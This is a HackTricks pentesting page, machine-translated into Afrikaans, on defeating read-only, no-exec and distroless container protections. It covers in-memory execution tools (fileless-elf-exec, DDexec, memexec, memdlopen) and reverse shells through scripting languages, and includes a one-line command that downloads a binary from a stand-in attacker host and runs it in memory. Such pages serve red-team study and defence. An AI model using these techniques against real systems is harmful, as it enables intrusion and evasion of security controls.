# Bypass FS protections: read-only / no-exec / Distroless

{{#include ../../../banners/hacktricks-training.md}}


## Video's

In die volgende video's vind jy die tegnieke wat op hierdie bladsy genoem word, meer in diepte verduidelik:

- [**DEF CON 31 - Exploring Linux Memory Manipulation for Stealth and Evasion**](https://www.youtube.com/watch?v=poHirez8jk4)
- [**Stealth intrusions with DDexec-ng & in-memory dlopen() - HackTricks Track 2023**](https://www.youtube.com/watch?v=VM_gjjiARaU)

## read-only / no-exec scenario

Dit word al hoe meer algemeen om linux-masjiene te vind wat gemonteer is met **read-only (ro) file system protection**, veral in containers. Dit is omdat dit so maklik is om 'n container met 'n ro file system te laat loop as om **`readOnlyRootFilesystem: true`** in die `securitycontext` te stel:

<pre class="language-yaml"><code class="lang-yaml">apiVersion: v1
kind: Pod
metadata:
name: alpine-pod
spec:
containers:
- name: alpine
image: alpine
securityContext:
<strong>      readOnlyRootFilesystem: true
</strong>    command: ["sh", "-c", "while true; do sleep 1000; done"]
</code></pre>

Alhoewel, selfs as die file system as ro gemonteer is, sal **`/dev/shm`** steeds beskryfbaar wees, dus is dit nie waar dat ons niks op die skyf kan skryf nie. Hierdie vouer sal egter **mounted with no-exec protection**, so as jy hier 'n binêre aflaai sal jy dit **nie kan uitvoer nie**.

> [!WARNING]
> Van 'n red team-perspektief maak dit dit **moeiliker om binêre lêers af te laai en uit te voer** wat nog nie op die stelsel is nie (soos backdoors of enumerators soos `kubectl`).

## Easiest bypass: Scripts

Let daarop dat ek binêre lêers genoem het; jy kan **enige script uitvoer** solank die interpreter in die masjien is, soos 'n **shell script** as `sh` beskikbaar is of 'n **python** **script** as `python` geïnstalleer is.

Dit is egter nie voldoende om jou binêre backdoor of ander binêre gereedskap wat jy dalk nodig het, te laat loop nie.

## Memory Bypasses

As jy 'n binêre wil uitvoer maar die file system dit nie toelaat nie, is die beste manier om dit te doen deur dit **from memory** uit te voer, aangesien die **protections doesn't apply in there**.

### FD + exec syscall bypass

As jy kragtige script-engines in die masjien het, soos **Python**, **Perl**, of **Ruby**, kan jy die binêre aflaai om vanaf geheue uit te voer, dit stoor in 'n geheue file descriptor (`create_memfd` syscall), wat nie deur daardie beskermings gedek word nie, en dan 'n **`exec` syscall** aanroep wat die **fd as the file to execute** aandui.

Vir dit kan jy maklik die projek [**fileless-elf-exec**](https://github.com/nnsee/fileless-elf-exec) gebruik. Jy kan 'n binêre daaraan gee en dit sal 'n script genereer in die aangeduide taal met die **binary compressed and b64 encoded** en instruksies om dit te **decode and decompress it** in 'n **fd** geskep deur `create_memfd` syscall en 'n oproep na die **exec** syscall om dit te laat loop.

> [!WARNING]
> Dit werk nie in ander scripting languages soos PHP of Node nie omdat hulle nie 'n d**efault way to call raw syscalls** van 'n script af het nie, so dit is nie moontlik om `create_memfd` aan te roep om die **memory fd** te skep om die binêre te stoor nie.
>
> Boonop sal die skep van 'n **regular fd** met 'n lêer in `/dev/shm` nie werk nie, aangesien jy nie toegelaat sal word om dit te laat loop nie omdat die **no-exec protection** van toepassing sal wees.

### DDexec / EverythingExec

[**DDexec / EverythingExec**](https://github.com/arget13/DDexec) is 'n tegniek wat jou toelaat om die geheue van jou eie proses te verander deur sy **`/proc/self/mem`** oor te skryf.

Dus, deur die **controlling the assembly code** wat deur die proses uitgevoer word te beheer, kan jy 'n **shellcode** skryf en die proses "mutate" om **execute any arbitrary code**.

> [!TIP]
> **DDexec / EverythingExec** sal jou toelaat om jou eie **shellcode** of **any binary** vanaf **memory** te laai en te **execute**.
```bash
# Basic example
wget -O- https://attacker.com/binary.elf | base64 -w0 | bash ddexec.sh argv0 foo bar
```
Vir meer inligting oor hierdie tegniek, sien die Github of:


{{#ref}}
ddexec.md
{{#endref}}

### MemExec

[**Memexec**](https://github.com/arget13/memexec) is die natuurlike volgende stap van DDexec. Dit is 'n **DDexec shellcode demonised**, so elke keer wat jy **run a different binary** wil, hoef jy nie DDexec te herbegin nie — jy kan net memexec shellcode via die DDexec-tegniek uitvoer en dan **communicate with this deamon to pass new binaries to load and run**.

Jy kan 'n voorbeeld vind van hoe om **memexec to execute binaries from a PHP reverse shell** te gebruik by [https://github.com/arget13/memexec/blob/main/a.php](https://github.com/arget13/memexec/blob/main/a.php).

### Memdlopen

Met 'n soortgelyke doel as DDexec, laat die [**memdlopen**](https://github.com/arget13/memdlopen) tegniek 'n **easier way to load binaries** in memory toe om dit later uit te voer. Dit kan selfs toelaat om binaries met dependencies te laai.

## Distroless Bypass

Vir 'n toegewyde verduideliking van **what distroless actually is**, wanneer dit help, wanneer dit nie help nie, en hoe dit post-exploitation tradecraft in containers verander, sien:

{{#ref}}
../../privilege-escalation/container-security/distroless.md
{{#endref}}

### Wat is distroless

Distroless containers bevat slegs die **bare minimum components necessary to run a specific application or service**, soos libraries en runtime dependencies, maar sluit groter komponente soos 'n package manager, shell, of system utilities uit.

Die doel van distroless containers is om die **reduce the attack surface of containers by eliminating unnecessary components** te verminder en die aantal kwesbaarhede wat uitgebuit kan word te minimaliseer.

### Reverse Shell

In 'n distroless container mag jy **not even find `sh` or `bash`** om 'n gewone shell te kry. Jy sal ook nie binaries soos `ls`, `whoami`, `id` vind nie... alles wat jy gewoonlik op 'n stelsel loop.

> [!WARNING]
> Daarom sal jy nie in staat wees om 'n **reverse shell** te kry of die stelsel te **enumerate** soos gewoonlik nie.

Indien die gekompromitteerde container byvoorbeeld 'n flask web bedien, is python dan geïnstalleer, en dus kan jy 'n **Python reverse shell** kry. As dit node loop, kan jy 'n Node rev shell kry, en dieselfde geld vir byna enige **scripting language**.

> [!TIP]
> Deur die **scripting language** te gebruik, kan jy die stelsel **enumerate** deur die taal se vermoëns.

As daar **no `read-only/no-exec`** beskerming is, kan jy jou reverse shell misbruik om **write in the file system your binaries** en dit te **execute**.

> [!TIP]
> In hierdie soort containers sal hierdie beskermings gewoonlik bestaan, maar jy kan die **previous memory execution techniques to bypass them** gebruik.

Jy sal **examples** vind oor hoe om sekere **RCE vulnerabilities** te **exploit** om scripting languages **reverse shells** te kry en binaries vanuit geheue uit te voer by [**https://github.com/carlospolop/DistrolessRCE**](https://github.com/carlospolop/DistrolessRCE).


{{#include ../../../banners/hacktricks-training.md}}
